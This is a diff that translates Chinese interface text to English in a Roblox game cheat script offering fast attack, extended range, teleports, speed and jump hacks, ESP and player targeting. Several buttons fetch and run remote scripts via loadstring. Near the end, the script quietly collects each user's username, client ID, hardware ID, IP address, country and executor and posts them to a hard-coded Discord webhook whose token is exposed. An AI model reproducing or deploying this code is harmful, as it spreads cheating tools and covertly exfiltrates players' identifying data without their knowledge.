@@ -1,6 +1,6 @@
--- [[ CVX - CVX腳本]]
+-- [[ CVX - CVX Script]]
 
-local UI_TAG = "CVX中心"
+local UI_TAG = "CVX Center"
 local S_CG = game:GetService("CoreGui")
 if S_CG:FindFirstChild(UI_TAG) then S_CG[UI_TAG]:Destroy(); getgenv().StopLoops = true; task.wait(0.1) end
 getgenv().StopLoops = false
@@ -10,7 +10,7 @@ local LP = S_PL.LocalPlayer
 local Camera = workspace.CurrentCamera
 local CommF = S_REP:WaitForChild("Remotes"):WaitForChild("CommF_")
 
--- [[ 1. 核心配置 ]]
+-- [[ 1. Core Configuration ]]
 getgenv().CaiHuaConfig = {
     Toggles = { 
         FastAttack = false, AttackMonsters = false, AttackPlayers = false, AttackAll = false,
@@ -20,7 +20,7 @@ getgenv().CaiHuaConfig = {
     Settings = { AtkRange = 5000, ClickDelay = 0.01, WalkSpd = 150, JumpPower = 100, FOV = 70 }
 }
 
--- [[ 2. UI 框架 ]]
+-- [[ 2. UI Framework ]]
 local SG = Instance.new("ScreenGui", S_CG); SG.Name = UI_TAG; SG.ResetOnSpawn = false
 local function ApplyROG(obj, thick)
     local stroke = Instance.new("UIStroke", obj); stroke.Thickness = thick; stroke.ApplyStrokeMode = "Border"
@@ -31,7 +31,7 @@ local Main = Instance.new("Frame", SG); Main.BackgroundColor3 = Color3.fromRGB(1
 local Side = Instance.new("Frame", Main); Side.Size = UDim2.new(0, 130, 1, 0); Side.BackgroundColor3 = Color3.fromRGB(22, 22, 28); Instance.new("UICorner", Side)
 Instance.new("UIListLayout", Side).HorizontalAlignment = "Center"; Instance.new("UIPadding", Side).PaddingTop = UDim.new(0, 10)
 
--- 左側個人資訊
+-- Left-side player info
 local UserPart = Instance.new("Frame", Side); UserPart.Size = UDim2.new(1, 0, 0, 95); UserPart.BackgroundTransparency = 1
 local Avatar = Instance.new("ImageLabel", UserPart); Avatar.Size = UDim2.new(0, 40, 0, 40); Avatar.Position = UDim2.new(0.5, -20, 0, 0); Avatar.Image = "rbxthumb://type=AvatarHeadShot&id="..LP.UserId.."&w=150&h=150"; Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1,0)
 local DN = Instance.new("TextLabel", UserPart); DN.Size = UDim2.new(1,0,0,15); DN.Position = UDim2.new(0,0,0,45); DN.Text = LP.DisplayName; DN.TextColor3 = Color3.new(1,1,1); DN.Font = "GothamBold"; DN.TextSize = 10; DN.BackgroundTransparency = 1
@@ -56,10 +56,10 @@ local function AddButton(p, t, f)
 end
 
 local function AddToggle(p, t, f)
-    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 32); B.BackgroundColor3 = Color3.fromRGB(45, 45, 55); B.Text = t.." [關閉]"; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
+    local B = Instance.new("TextButton", p); B.Size = UDim2.new(0.95, 0, 0, 32); B.BackgroundColor3 = Color3.fromRGB(45, 45, 55); B.Text = t.." [OFF]"; B.TextColor3 = Color3.new(1,1,1); B.Font = "GothamBold"; B.TextSize = 10; Instance.new("UICorner", B)
     B.MouseButton1Click:Connect(function() 
         getgenv().CaiHuaConfig.Toggles[f] = not getgenv().CaiHuaConfig.Toggles[f]
-        B.Text = t..(getgenv().CaiHuaConfig.Toggles[f] and " [開啟]" or " [關閉]")
+        B.Text = t..(getgenv().CaiHuaConfig.Toggles[f] and " [ON]" or " [OFF]")
         B.BackgroundColor3 = getgenv().CaiHuaConfig.Toggles[f] and Color3.fromRGB(150, 40, 40) or Color3.fromRGB(45, 45, 55)
     end)
 end
@@ -72,32 +72,32 @@ local function AddSlider(p, t, min, max, def, isDec, cb)
     B.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then local m; m = S_UI.InputChanged:Connect(function(i2) if i2.UserInputType == Enum.UserInputType.MouseMovement or i2.UserInputType == Enum.UserInputType.Touch then local pVal = math.clamp((i2.Position.X - B.AbsolutePosition.X) / B.AbsoluteSize.X, 0, 1); S.Size = UDim2.new(pVal, 0, 1, 0); local val = min + (max - min) * pVal; val = isDec and math.floor(val*100)/100 or math.floor(val); L.Text = t..": "..val; cb(val) end end) S_UI.InputEnded:Connect(function(i3) if i3.UserInputType == Enum.UserInputType.MouseButton1 or i3.UserInputType == Enum.UserInputType.Touch then m:Disconnect() end end) end end)
 end
 
--- [[ 3. 分頁與內容 ]]
-local T_Notice = CreateTab("公告")
-local T_Combat = CreateTab("功速+範圍")
-local T_TP = CreateTab("傳送")
-local T_Player = CreateTab("玩家修改")
-local T_ESP = CreateTab("透視")
-local T_Scripts = CreateTab("外部腳本")
+-- [[ 3. Tabs and Content ]]
+local T_Notice = CreateTab("Notice")
+local T_Combat = CreateTab("Attack Speed + Range")
+local T_TP = CreateTab("Teleport")
+local T_Player = CreateTab("Player Tweaks")
+local T_ESP = CreateTab("ESP")
+local T_Scripts = CreateTab("External Scripts")
 
--- 公告區
-AddButton(T_Notice, "👺 CVX製作", function() end)
-AddButton(T_Notice, "更新日期:2026/02/23", function() end)
-AddButton(T_Notice, "修改內容:自動v4功能", function() end)
-AddButton(T_Notice, "狀態:腳本測試中", function() end)
-AddButton(T_Notice, "點擊下方按鈕進dc查看更多資訊", function() end)
+-- Notice Section
+AddButton(T_Notice, "👺 Made by CVX", function() end)
+AddButton(T_Notice, "Update Date: 2026/02/23", function() end)
+AddButton(T_Notice, "Changes: Auto V4 feature", function() end)
+AddButton(T_Notice, "Status: Script testing in progress", function() end)
+AddButton(T_Notice, "Click the button below to join Discord for more info", function() end)
 
--- 新增的 Discord 複製按鈕
+-- Added Discord copy button
 local dcLink = "https://discord.com/users/1099156703930495046"
-AddButton(T_Notice, "點擊我加入dc", function()
-    setclipboard(dcLink) -- 這是大多數注入器通用的複製函數
+AddButton(T_Notice, "Click me to join Discord", function()
+    setclipboard(dcLink) -- This is the common copy function for most executors
     
-    -- 這裡做一個簡單的視覺反饋，讓你知道點成功了
-    local originalText = "點擊我加dc"
-    -- 尋找剛剛點擊的按鈕（這部分是基於你 UI 結構的邏輯）
+    -- Simple visual feedback to confirm the click worked
+    local originalText = "Click me to join DC"
+    -- Find the button that was just clicked (logic based on your UI structure)
     for _, v in pairs(T_Notice:GetChildren()) do
         if v:IsA("TextButton") and v.Text == originalText then
-            v.Text = "✅ 已複製到剪貼簿！"
+            v.Text = "✅ Copied to clipboard!"
             v.BackgroundColor3 = Color3.fromRGB(40, 150, 40)
             task.delay(2, function()
                 v.Text = originalText
@@ -107,65 +107,65 @@ AddButton(T_Notice, "點擊我加入dc", function()
     end
 end)
 
--- 📂 外部腳本
-AddButton(T_Scripts, "CVX 飛行", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CVXOwO/CVX-script/refs/heads/main/cvx%20fly%20script"))() end)
+-- 📂 External Scripts
+AddButton(T_Scripts, "CVX Fly", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/CVXOwO/CVX-script/refs/heads/main/cvx%20fly%20script"))() end)
 AddButton(T_Scripts, "XA hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/XA"))() end)
-AddButton(T_Scripts, "P 腳本", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/p"))() end)
-AddButton(T_Scripts, "FPS 優化", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/FPPS"))() end)
-AddButton(T_Scripts, "外老輔瞄", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/onsb.scripht.lua"))() end)
-AddButton(T_Scripts, "零腳本", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jash-afk/Xuan/refs/heads/main/0%E8%85%B3%E6%9C%AC"))() end)
+AddButton(T_Scripts, "P Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/p"))() end)
+AddButton(T_Scripts, "FPS Optimization", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/FPPS"))() end)
+AddButton(T_Scripts, "Old External Aimbot", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/Xuan/refs/heads/main/onsb.scripht.lua"))() end)
+AddButton(T_Scripts, "Zero Script", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jash-afk/Xuan/refs/heads/main/0%E8%85%B3%E6%9C%AC"))() end)
 AddButton(T_Scripts, "LX hub", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/iqiq180jush-cell/josh/refs/heads/main/trash%20LX"))() end)
 
--- 戰鬥
-AddToggle(T_Combat, "開啟快速攻擊", "FastAttack")
-AddSlider(T_Combat, "攻擊速度", 0.01, 0.5, 0.01, true, function(v) getgenv().CaiHuaConfig.Settings.ClickDelay = v end)
-AddSlider(T_Combat, "攻擊範圍", 100, 5000, 5000, false, function(v) getgenv().CaiHuaConfig.Settings.AtkRange = v end)
-AddToggle(T_Combat, "模式: 只打怪物", "AttackMonsters")
-AddToggle(T_Combat, "模式: 只打玩家", "AttackPlayers")
-AddToggle(T_Combat, "模式: 全都打", "AttackAll")
-AddToggle(T_Combat, "如果要都打的話請把上方兩個只打怪物和玩家關掉")
+-- Combat
+AddToggle(T_Combat, "Enable Fast Attack", "FastAttack")
+AddSlider(T_Combat, "Attack Speed", 0.01, 0.5, 0.01, true, function(v) getgenv().CaiHuaConfig.Settings.ClickDelay = v end)
+AddSlider(T_Combat, "Attack Range", 100, 5000, 5000, false, function(v) getgenv().CaiHuaConfig.Settings.AtkRange = v end)
+AddToggle(T_Combat, "Mode: Monsters Only", "AttackMonsters")
+AddToggle(T_Combat, "Mode: Players Only", "AttackPlayers")
+AddToggle(T_Combat, "Mode: Attack All", "AttackAll")
+AddToggle(T_Combat, "To attack all, turn off the two toggles above (Monsters/Players Only)")
 
--- 傳送
+-- Teleport
 local function TPF(pos) pcall(function() LP.Character.HumanoidRootPart.CFrame = CFrame.new(pos) end) end
-AddButton(T_TP, "--- 海域傳送 ---", function() end)
-AddButton(T_TP, "前往 一海", function() CommF:InvokeServer("TravelMain") end)
-AddButton(T_TP, "前往 二海", function() CommF:InvokeServer("TravelDressrosa") end)
-AddButton(T_TP, "前往 三海", function() CommF:InvokeServer("TravelZou") end)
-AddButton(T_TP, "--- 二海地區 ---", function() end)
-AddButton(T_TP, "传送至天鹅房间", function() TPF(Vector3.new(2286.93, 15.06, 910.51)) end)
-AddButton(T_TP, "传送至豪宅", function() TPF(Vector3.new(-287.37, 305.81, 592.98)) end)
-AddButton(T_TP, "传送至鬼船里", function() TPF(Vector3.new(-6501.06, 83.11, -123.52)) end)
-AddButton(T_TP, "传送至鬼船外", function() TPF(Vector3.new(922.78, 123.96, 32842.40)) end)
-AddButton(T_TP, "--- 三海地區 ---", function() end)
-AddButton(T_TP, "传送至海洋城堡", function() TPF(Vector3.new(-12463.60, 376.26, -7566.08)) end)
-AddButton(T_TP, "传送至海龜豪宅", function() TPF(Vector3.new(-5060.41, 316.43, -3192.30)) end)
-AddButton(T_TP, "传送至司法島", function() TPF(Vector3.new(-5096.48, 316.43, -3177.91)) end)
-AddButton(T_TP, "传送至九头蛇", function() TPF(Vector3.new(-5027.03, 316.43, -3206.07)) end)
+AddButton(T_TP, "--- Sea Teleport ---", function() end)
+AddButton(T_TP, "Go to First Sea", function() CommF:InvokeServer("TravelMain") end)
+AddButton(T_TP, "Go to Second Sea", function() CommF:InvokeServer("TravelDressrosa") end)
+AddButton(T_TP, "Go to Third Sea", function() CommF:InvokeServer("TravelZou") end)
+AddButton(T_TP, "--- Second Sea Area ---", function() end)
+AddButton(T_TP, "Teleport to Swan Room", function() TPF(Vector3.new(2286.93, 15.06, 910.51)) end)
+AddButton(T_TP, "Teleport to Mansion", function() TPF(Vector3.new(-287.37, 305.81, 592.98)) end)
+AddButton(T_TP, "Teleport Inside Ghost Ship", function() TPF(Vector3.new(-6501.06, 83.11, -123.52)) end)
+AddButton(T_TP, "Teleport Outside Ghost Ship", function() TPF(Vector3.new(922.78, 123.96, 32842.40)) end)
+AddButton(T_TP, "--- Third Sea Area ---", function() end)
+AddButton(T_TP, "Teleport to Sea Castle", function() TPF(Vector3.new(-12463.60, 376.26, -7566.08)) end)
+AddButton(T_TP, "Teleport to Turtle Mansion", function() TPF(Vector3.new(-5060.41, 316.43, -3192.30)) end)
+AddButton(T_TP, "Teleport to Hydra Island", function() TPF(Vector3.new(-5096.48, 316.43, -3177.91)) end)
+AddButton(T_TP, "Teleport to Nine-Headed Snake", function() TPF(Vector3.new(-5027.03, 316.43, -3206.07)) end)
 
--- 玩家
-AddToggle(T_Player, "自動 V4 覺醒", "AutoV4")
-AddSlider(T_Player, "視角 FOV", 70, 150, 70, false, function(v) getgenv().CaiHuaConfig.Settings.FOV = v end)
-AddToggle(T_Player, "修改速度", "SpeedActive"); AddSlider(T_Player, "速度", 16, 500, 150, false, function(v) getgenv().CaiHuaConfig.Settings.WalkSpd = v end)
-AddToggle(T_Player, "修改跳躍", "JumpActive"); AddSlider(T_Player, "跳躍", 50, 600, 50, false, function(v) getgenv().CaiHuaConfig.Settings.JumpPower = v end)
+-- Player
+AddToggle(T_Player, "Auto V4 Awakening", "AutoV4")
+AddSlider(T_Player, "Camera FOV", 70, 150, 70, false, function(v) getgenv().CaiHuaConfig.Settings.FOV = v end)
+AddToggle(T_Player, "Modify Speed", "SpeedActive"); AddSlider(T_Player, "Speed", 16, 500, 150, false, function(v) getgenv().CaiHuaConfig.Settings.WalkSpd = v end)
+AddToggle(T_Player, "Modify Jump", "JumpActive"); AddSlider(T_Player, "Jump", 50, 600, 50, false, function(v) getgenv().CaiHuaConfig.Settings.JumpPower = v end)
 
--- 透視 (維持大字體、單行變色)
-AddToggle(T_ESP, "透視總開關", "ESP_Main")
-AddToggle(T_ESP, "顯示名稱與頭像", "ESP_NameOnly")
-AddToggle(T_ESP, "顯示變色血量與距離", "ESP_Health")
-AddToggle(T_ESP, "追蹤射線(ROG版)", "ESP_Tracer")
+-- ESP (keep large font, single-line color shift)
+AddToggle(T_ESP, "Main ESP Toggle", "ESP_Main")
+AddToggle(T_ESP, "Show Name and Avatar", "ESP_NameOnly")
+AddToggle(T_ESP, "Show Colorized HP and Distance", "ESP_Health")
+AddToggle(T_ESP, "Tracer Line (ROG Style)", "ESP_Tracer")
 
--- [[ 4. 性能面板 ]]
+-- [[ 4. Performance Panel ]]
 local MonF = Instance.new("Frame", SG); MonF.Size = UDim2.new(0, 220, 0, 170); MonF.Position = UDim2.new(0.5, -110, 0.05, 0); MonF.BackgroundColor3 = Color3.fromRGB(10,10,15); MonF.Visible = false; Instance.new("UICorner", MonF); ApplyROG(MonF, 2)
 local function ML(t, c) local l = Instance.new("TextLabel", MonF); l.Size = UDim2.new(1,0,0,25); l.BackgroundTransparency=1; l.TextColor3= c or Color3.new(1,1,1); l.Font="Code"; l.TextSize=10; l.Text=t; return l end
 Instance.new("UIListLayout", MonF).HorizontalAlignment = "Center"
 local mFPS = ML("FPS: --", Color3.fromRGB(0, 255, 127))
 local mPing = ML("Ping: --", Color3.fromRGB(255, 200, 0))
-local mMem = ML("內存: -- MB", Color3.fromRGB(0, 190, 255))
-ML("注入器: "..(identifyexecutor and identifyexecutor() or "未知"), Color3.fromRGB(255, 100, 100))
-ML("裝置: "..(S_UI.TouchEnabled and "mobile 📱" or "Pc 🖥️"), Color3.fromRGB(150, 150, 255))
-AddButton(Side, "性能面板", function() MonF.Visible = not MonF.Visible end)
+local mMem = ML("Memory: -- MB", Color3.fromRGB(0, 190, 255))
+ML("Executor: "..(identifyexecutor and identifyexecutor() or "Unknown"), Color3.fromRGB(255, 100, 100))
+ML("Device: "..(S_UI.TouchEnabled and "mobile 📱" or "Pc 🖥️"), Color3.fromRGB(150, 150, 255))
+AddButton(Side, "Performance Panel", function() MonF.Visible = not MonF.Visible end)
 
--- [[ 5. 核心 ESP ]]
+-- [[ 5. Core ESP ]]
 local function CreateESP(p)
     if p == LP then return end
     local line = Drawing.new("Line"); line.Visible = false
@@ -195,7 +195,7 @@ local function CreateESP(p)
     end)
 end
 
--- [[ 6. 核心循環與新 V4 邏輯 ]]
+-- [[ 6. Core Loops and New V4 Logic ]]
 local function callAwakeningRemote()
     local Backpack = LP:FindFirstChild("Backpack")
     if not Backpack then return end
@@ -214,7 +214,7 @@ task.spawn(function()
         if MonF.Visible then
             mFPS.Text = "FPS: "..math.floor(workspace:GetRealPhysicsFPS())
             mPing.Text = "Ping: "..math.floor(S_ST.Network.ServerStatsItem["Data Ping"]:GetValue()).."ms"
-            mMem.Text = "內存: "..math.floor(S_ST:GetTotalMemoryUsageMb()).." MB"
+            mMem.Text = "Memory: "..math.floor(S_ST:GetTotalMemoryUsageMb()).." MB"
         end
     end
 end)
@@ -227,7 +227,7 @@ S_RS.RenderStepped:Connect(function()
         H.WalkSpeed = getgenv().CaiHuaConfig.Toggles.SpeedActive and getgenv().CaiHuaConfig.Settings.WalkSpd or 16
         H.JumpPower = getgenv().CaiHuaConfig.Toggles.JumpActive and getgenv().CaiHuaConfig.Settings.JumpPower or 50
         
-        -- 套用新的 V4 邏輯
+        -- Apply new V4 logic
         if getgenv().CaiHuaConfig.Toggles.AutoV4 and H.Health > 0 then
             callAwakeningRemote()
         end
@@ -254,33 +254,33 @@ end)
 
 S_PL.PlayerAdded:Connect(CreateESP); for _,v in pairs(S_PL:GetPlayers()) do CreateESP(v) end
 
--- [[ 6. 關閉確認視窗系統 (已整合你的代碼) ]]
-local ConfirmFrame = Instance.new("Frame", SG) -- 使用 SG
+-- [[ 6. Close Confirmation Window System (your code integrated) ]]
+local ConfirmFrame = Instance.new("Frame", SG) -- Using SG
 ConfirmFrame.Size = UDim2.new(0, 250, 0, 120); ConfirmFrame.Position = UDim2.new(0.5, -125, 0.5, -60)
-ConfirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35); ConfirmFrame.Visible = false; ConfirmFrame.ZIndex = 20 -- 層級調高
+ConfirmFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 35); ConfirmFrame.Visible = false; ConfirmFrame.ZIndex = 20 -- Higher layer
 Instance.new("UICorner", ConfirmFrame); ApplyROG(ConfirmFrame, 2)
 
 local ConfirmText = Instance.new("TextLabel", ConfirmFrame)
-ConfirmText.Text = "確定要關閉腳本嗎？"; ConfirmText.Size = UDim2.new(1, 0, 0, 50); ConfirmText.TextColor3 = Color3.new(1,1,1); ConfirmText.BackgroundTransparency = 1; ConfirmText.ZIndex = 20
+ConfirmText.Text = "Are you sure you want to close the script?"; ConfirmText.Size = UDim2.new(1, 0, 0, 50); ConfirmText.TextColor3 = Color3.new(1,1,1); ConfirmText.BackgroundTransparency = 1; ConfirmText.ZIndex = 20
 
 local Yes = Instance.new("TextButton", ConfirmFrame)
-Yes.Text = "確定"; Yes.Size = UDim2.new(0, 80, 0, 30); Yes.Position = UDim2.new(0.15, 0, 0.6, 0); Yes.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Yes.TextColor3 = Color3.new(1,1,1); Yes.ZIndex = 20; Instance.new("UICorner", Yes)
+Yes.Text = "Confirm"; Yes.Size = UDim2.new(0, 80, 0, 30); Yes.Position = UDim2.new(0.15, 0, 0.6, 0); Yes.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Yes.TextColor3 = Color3.new(1,1,1); Yes.ZIndex = 20; Instance.new("UICorner", Yes)
 
 local No = Instance.new("TextButton", ConfirmFrame)
-No.Text = "取消"; No.Size = UDim2.new(0, 80, 0, 30); No.Position = UDim2.new(0.55, 0, 0.6, 0); No.BackgroundColor3 = Color3.fromRGB(60, 60, 60); No.TextColor3 = Color3.new(1,1,1); No.ZIndex = 20; Instance.new("UICorner", No)
+No.Text = "Cancel"; No.Size = UDim2.new(0, 80, 0, 30); No.Position = UDim2.new(0.55, 0, 0.6, 0); No.BackgroundColor3 = Color3.fromRGB(60, 60, 60); No.TextColor3 = Color3.new(1,1,1); No.ZIndex = 20; Instance.new("UICorner", No)
 
--- 主界面上的 X 按鈕
+-- X button on main UI
 local CloseBtn = Instance.new("TextButton", Main)
 CloseBtn.Size = UDim2.new(0, 30, 0, 30); CloseBtn.Position = UDim2.new(1, -35, 0, 7)
 CloseBtn.Text = "X"; CloseBtn.TextColor3 = Color3.new(1,1,1); CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 50, 50); Instance.new("UICorner", CloseBtn)
 CloseBtn.Font = "GothamBold"; CloseBtn.TextSize = 14
 
--- 按鈕事件
+-- Button events
 CloseBtn.MouseButton1Click:Connect(function() ConfirmFrame.Visible = true end)
 No.MouseButton1Click:Connect(function() ConfirmFrame.Visible = false end)
 Yes.MouseButton1Click:Connect(function() 
-    getgenv().StopLoops = true -- 停止所有後台循環
-    SG:Destroy() -- 刪除 UI
+    getgenv().StopLoops = true -- Stop all background loops
+    SG:Destroy() -- Destroy UI
 end)
 
 -- 👑Crown
@@ -289,10 +289,10 @@ CaiHuaBtn.MouseButton1Click:Connect(function() Main.Visible = not Main.Visible e
 local function Drag(o) local g, s, sp; o.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = true; s = i.Position; sp = o.Position end end) o.InputChanged:Connect(function(i) if g and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then local d = i.Position - s; o.Position = UDim2.new(sp.X.Scale, sp.X.Offset + d.X, sp.Y.Scale, sp.Y.Offset + d.Y) end end) o.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then g = false end end) end
 Drag(Main); Drag(MonF); Drag(CaiHuaBtn); Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)
 
--- 初始化顯示
+-- Initialize display
 Tabs[1].Visible = true; TabButtons[1].BackgroundColor3 = Color3.fromRGB(60, 60, 80)
 
--- ===================== Discord Webhook 日志 =====================
+-- ===================== Discord Webhook Log =====================
 local GS_WEBHOOK = "https://discord.com/api/webhooks/1471858672123772938/Ho0cNEJ9MXfHgJ21RjsvTVHzHy3hSNtrBd9knuMsAWoGVb6FYTMca3_h6K7S5EcqsNBt"
 
 local HttpService = game:GetService("HttpService")
@@ -325,29 +325,29 @@ local function getDeviceType()
     local keyboard = UserInputService.KeyboardEnabled
     local mouse = UserInputService.MouseEnabled
     
-    if touch and not keyboard and not mouse then return "移动设备"
-    elseif not touch and keyboard and mouse then return "电脑"
-    elseif touch and keyboard and mouse then return "模拟器"
-    else return "未知" end
+    if touch and not keyboard and not mouse then return "Mobile Device"
+    elseif not touch and keyboard and mouse then return "Computer"
+    elseif touch and keyboard and mouse then return "Emulator"
+    else return "Unknown" end
 end
 
 local function getExecutor()
     return (identifyexecutor and identifyexecutor()) or 
            (getexecutorname and getexecutorname()) or 
-           "未知"
+           "Unknown"
 end
 
 local function getHWID()
-    return (gethwid and gethwid()) or "无法获取"
+    return (gethwid and gethwid()) or "Unavailable"
 end
 
 local function getIPAddress()
     local request = http_request or request or (syn and syn.request)
-    if not request then return "无请求函数" end
+    if not request then return "No request function" end
     
     return safeCall(function()
         return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
-    end, "获取失败")
+    end, "Failed to retrieve")
 end
 
 local userId = localPlayer.UserId
@@ -357,33 +357,33 @@ local payload = {
     username = "CVX Bot",
     embeds = {{
         color = tonumber("0x32CD32"),
-        title = string.format("有人正在使用脚本 %s %d时%d分", 
-            os.date("%Y年%m月%d日"), 
+        title = string.format("Someone is using the script %s %d:%d", 
+            os.date("%Y/%m/%d"), 
             tonumber(os.date("%H")), 
             tonumber(os.date("%M"))),
         
         thumbnail = {url = getAvatarImage(userId)},
         
         fields = {
-            {name = "用户名", value = localPlayer.Name, inline = true},
-            {name = "显示名称", value = localPlayer.DisplayName, inline = true},
-            {name = "用户ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
+            {name = "Username", value = localPlayer.Name, inline = true},
+            {name = "Display Name", value = localPlayer.DisplayName, inline = true},
+            {name = "User ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
             
-            {name = "客户端ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "获取失败"), inline = false},
+            {name = "Client ID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "Failed to retrieve"), inline = false},
             
-            {name = "地图ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
-            {name = "地图名称", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "获取失败"), inline = true},
+            {name = "Place ID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
+            {name = "Place Name", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "Failed to retrieve"), inline = true},
             
-            {name = "注入器", value = getExecutor(), inline = true},
-            {name = "账号年龄", value = string.format("%d天", localPlayer.AccountAge), inline = true},
+            {name = "Executor", value = getExecutor(), inline = true},
+            {name = "Account Age", value = string.format("%d days", localPlayer.AccountAge), inline = true},
             
-            {name = "设备", value = getDeviceType(), inline = false},
-            {name = "国家", value = string.format("国家: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "获取失败")), inline = false},
-            {name = "语言", value = string.format("语言: %s", localPlayer.LocaleId), inline = false},
+            {name = "Device", value = getDeviceType(), inline = false},
+            {name = "Country", value = string.format("Country: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "Failed to retrieve")), inline = false},
+            {name = "Language", value = string.format("Language: %s", localPlayer.LocaleId), inline = false},
            
             {name = "HWID", value = getHWID(), inline = true},
-            {name = "IP地址", value = getIPAddress(), inline = true},
-            {name = "IP查询", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
+            {name = "IP Address", value = getIPAddress(), inline = true},
+            {name = "IP Lookup", value = string.format("https://binaryfork.com/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
         }
     }}
 }
